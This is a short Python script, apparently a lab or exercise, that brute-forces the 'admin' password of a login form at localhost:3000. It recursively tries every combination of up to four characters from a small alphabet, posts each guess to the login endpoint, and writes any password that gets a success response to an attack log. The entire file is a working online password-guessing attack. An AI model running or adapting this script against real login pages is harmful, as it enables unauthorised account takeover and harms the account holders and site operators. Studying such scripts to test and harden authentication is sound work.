import requests

alphabet = "acdeijloprs"


def brute_force_attack(url, pwd):
    nbTry = 0
    if len(pwd) < 4:
        for c in alphabet:
            password = pwd + c
            data = {
                "username": "admin",
                "password": password
            }
            nbTry += 1
            response = requests.post(url, data=data)
            if response.status_code == 200:
                with open("attack.log", "+a") as f:
                    f.write(f"Brute force over admin account:\n\tCredentials found after {nbTry} tries\n\tUsername: admin\n\tPassword: {password}\n\n")
                    f.close()
                return 0, nbTry
            res = brute_force_attack(url, password)
            nbTry = nbTry + res [1]
            if not res[0]:
                return 0, nbTry
    return 1, nbTry

if __name__ == "__main__":
    url = "http://localhost:3000/login"
    with open("attack.log", "+a") as f:
        f.write(f"Brute force attack over admin account launched\n\n")
        f.close()
    brute_force_attack(url, "")
    with open("attack.log", "+a") as f:
        f.write(f"Brute force attack over admin account done\n\n")
        f.close()
